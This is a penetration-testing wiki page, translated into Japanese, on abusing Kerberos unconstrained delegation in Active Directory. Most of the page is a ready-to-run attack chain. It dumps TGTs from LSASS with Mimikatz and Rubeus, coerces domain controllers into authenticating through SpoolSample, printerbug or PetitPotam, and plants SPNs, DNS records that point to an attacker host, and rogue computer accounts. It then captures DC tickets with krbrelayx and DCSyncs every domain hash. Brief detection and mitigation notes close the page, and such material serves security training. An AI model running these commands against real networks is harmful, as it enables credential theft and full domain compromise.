# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

これは、Domain Administrator がドメイン内の任意の **Computer** に設定できる機能です。その後、**user が Computer にログインする**たびに、その user の **TGT のコピー**が DC によって提供される **TGS 内に送信され**、**LSASS のメモリに保存**されます。したがって、その machine 上で Administrator 権限を持っていれば、**ticket を dump して、任意の machine 上で user を impersonate**できるようになります。

つまり、"Unconstrained Delegation" 機能が有効化された Computer に domain admin がログインし、その machine 内で local admin 権限を持っている場合、ticket を dump して、どこでも Domain Admin を impersonate できるようになります（domain privesc）。

**この attribute を持つ Computer object** は、[userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) attribute に [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) が含まれているかを確認することで**見つけられます**。これは、‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’ という LDAP filter を使って実行できます。powerview が行っている処理もこれです：
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
Administrator（または被害ユーザー）の ticket を **Mimikatz** または **Rubeus** でメモリにロードし、[**Pass the Ticket**](pass-the-ticket.md)**を実行します。**\
詳細情報: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)<sup>[[2]](#references)</sup>\
[**ired.team の Unconstrained delegation に関する詳細情報。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>

### **Force Authentication**

攻撃者が **「Unconstrained Delegation」** を許可された **コンピューターを compromise** できる場合、**Print server** を**自動的にログイン**するよう**誘導**し、サーバーのメモリに **TGT** を保存させることができます。\
その後、攻撃者は **Pass the Ticket attack を実行して**、Print server コンピューターアカウントのユーザーになりすますことができます。

任意のマシンに対して print server をログインさせるには、[**SpoolSample**](https://github.com/leechristensen/SpoolSample) を使用できます。
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
TGT がドメインコントローラーのものであれば、[**DCSync attack**](acl-persistence-abuse/index.html#dcsync) を実行して、DC からすべての hash を取得できます。\
[**この attack の詳細は ired.team を参照してください。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>

ここでは、**authentication を強制する**その他の方法を紹介します:


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

被害者を **Kerberos** で unconstrained-delegation host に authentication させる、その他の coercion primitive も利用できます。最新の環境では、到達可能な RPC surface に応じて、従来の PrinterBug flow の代わりに **PetitPotam**、**DFSCoerce**、**ShadowCoerce**、**MS-EVEN**、または **WebClient/WebDAV** ベースの coercion を使用することがよくあります。

### unconstrained delegation が設定された user/service account の悪用

Unconstrained delegation は **computer object に限定されません**。**user/service account** にも `TRUSTED_FOR_DELEGATION` を設定できます。この場合の実質的な要件は、その account が**自身の所有する SPN**に対する Kerberos service ticket を受け取ることです。

これにより、非常によくある 2 つの offensive path につながります:

1. unconstrained-delegation の **user account** の password/hash を compromise し、その同じ account に **SPN を追加**する。
2. account にすでに 1 つ以上の SPN が存在するものの、そのうちの 1 つが**古い/廃止済みの hostname**を指している場合、欠落している **DNS A record**を再作成するだけで、SPN set を変更せずに authentication flow を hijack できます。<sup>[[8]](#references)</sup>

Linux での最小限の flow:
```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```
Notes:

- これは、unconstrained delegation の principal が **service account** であり、joined host 上での code execution はなく、その credentials のみを持っている場合に特に有用です。
- 対象ユーザーがすでに **stale SPN** を持っている場合、AD に新しい SPN を書き込むよりも、対応する **DNS record** を再作成するほうが、ノイズを抑えられる可能性があります。
- 最近の Linux-centric tradecraft では、`addspn.py`、`dnstool.py`、`krbrelayx.py` と1つの coercion primitive を使用します。この chain を完了するために Windows host に触れる必要はありません。

### attacker-created computer を使用した Unconstrained Delegation の悪用

Modern domains では、`MachineAccountQuota > 0`（default は 10）であることが多く、認証済みの principal であれば、最大 N 個の computer object を作成できます。さらに `SeEnableDelegationPrivilege` token privilege（または同等の rights）を保持している場合、新しく作成した computer を unconstrained delegation が信頼されるように設定し、privileged system からの inbound TGT を harvest できます。<sup>[[1]](#references)</sup>

High-level flow:

1) 自分が制御する computer を作成する
```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```
2) ドメイン内で偽のホスト名を名前解決可能にする
```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
--action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
-dns-ip <DC_IP> <DC_FQDN>
```
3) 攻撃者が制御するコンピューターで Unconstrained Delegation を有効化
```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```
なぜこれが機能するのか：unconstrained delegation では、delegation-enabled computer 上の LSA が受信した TGTs をキャッシュします。DC または privileged server を偽のホストに対して認証するよう誘導すると、その machine TGT が保存され、export できます。

4) krbrelayx を export mode で起動し、Kerberos material を準備する
```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```
5) DC/servers から偽装ホストへの authentication を強制的に発生させる
```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```
krbrelayx は、マシンが認証すると ccache ファイルを保存します。たとえば:
```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```
6) 取得した DC machine TGT を使用して DCSync を実行する
```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
- `MachineAccountQuota > 0` により、権限のないユーザーでもコンピューターを作成できます。それ以外の場合は、明示的な権限が必要です。
- コンピューターに `TRUSTED_FOR_DELEGATION` を設定するには、`SeEnableDelegationPrivilege`（または domain admin）が必要です。
- 偽のホストへの名前解決（DNS A レコード）を確保し、DC が FQDN でそのホストに到達できるようにします。
- Coercion には、利用可能なベクター（PrinterBug/MS-RPRN、EFSRPC/PetitPotam、DFSCoerce、MS-EVEN など）が必要です。可能であれば、DC ではこれらを無効化してください。
- 被害アカウントに **「Account is sensitive and cannot be delegated」** が設定されている場合、または **Protected Users** のメンバーである場合、転送された TGT は service ticket に含まれません。そのため、この chain から再利用可能な TGT は取得できません。<sup>[[9]](#references)</sup>
- 認証を行う client/server で **Credential Guard** が有効になっている場合、Windows は **Kerberos unconstrained delegation** をブロックします。そのため、オペレーター側から見ると、有効なはずの coercion path が失敗することがあります。

検知と hardening のアイデア:

- UAC に `TRUSTED_FOR_DELEGATION` が設定された際の Event ID 4741（コンピューターアカウントの作成）および 4742/4738（コンピューター／ユーザーアカウントの変更）を alert します。
- domain zone における、通常とは異なる DNS A レコードの追加を monitor します。
- 予期しないホストからの 4768/4769、および DC から非 DC ホストへの認証の急増を監視します。
- `SeEnableDelegationPrivilege` を最小限の set に制限し、可能な場合は `MachineAccountQuota=0` を設定し、DC では Print Spooler を無効化します。LDAP signing と channel binding を強制します。

### Mitigation

- DA/Admin の login を特定の service に限定する
- privileged account に「Account is sensitive and cannot be delegated」を設定する。

## 参考資料

- [1] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [2] [harmj0y – S4U2Pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- [3] [ired.team – Domain compromise via unrestricted delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- [4] [krbrelayx](https://github.com/dirkjanm/krbrelayx)
- [5] [Impacket addcomputer.py](https://github.com/fortra/impacket)
- [6] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [7] [netexec (CME fork)](https://github.com/Pennyw0rth/NetExec)
- [8] [Praetorian – Unconstrained Delegation in Active Directory](https://www.praetorian.com/blog/unconstrained-delegation-active-directory/)
- [9] [Microsoft Learn – Protected Users Security Group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [10] [ired.team – Domain compromise via DC print server and Kerberos delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

{{#include ../../banners/hacktricks-training.md}}
